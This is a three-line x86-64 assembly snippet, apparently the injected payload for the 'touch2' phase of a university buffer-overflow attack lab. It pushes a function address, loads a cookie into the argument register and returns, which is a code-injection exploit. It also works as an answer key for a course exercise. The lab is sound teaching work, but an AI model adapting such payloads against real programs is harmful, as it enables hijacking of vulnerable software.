pushq $0x4017ec  #put the addr of touch2 into the stacks
movq $0x59b997fa,%rdi  #set the cookies as the first argument of touch2
retq  #return to the touch2
